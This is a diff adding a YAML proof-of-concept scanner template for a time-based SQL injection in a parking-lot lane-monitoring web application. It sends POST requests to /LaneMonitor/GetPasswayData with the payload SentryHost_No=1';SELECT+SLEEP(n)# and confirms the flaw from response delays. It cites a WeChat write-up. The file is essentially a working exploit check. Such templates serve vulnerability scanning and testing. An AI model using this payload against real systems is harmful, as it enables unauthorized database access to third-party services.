@@ -1,0 +1,29 @@
+name: poc-yaml-tingchechang-GetPasswayData-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /LaneMonitor/GetPasswayData
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: SentryHost_No=1';SELECT+SLEEP(4)#
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: POST
+      path: /LaneMonitor/GetPasswayData
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: SentryHost_No=1';SELECT+SLEEP(8)#
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486909&idx=1&sn=38196687551dfb4accd375d9a27c9dac&chksm=c267b88ef5103198acdeab3ef21f55a6c24c9d8cb8f7a5216b2095213bdecd912a7e3fbf005b&token=239710718&lang=zh_CN#rd
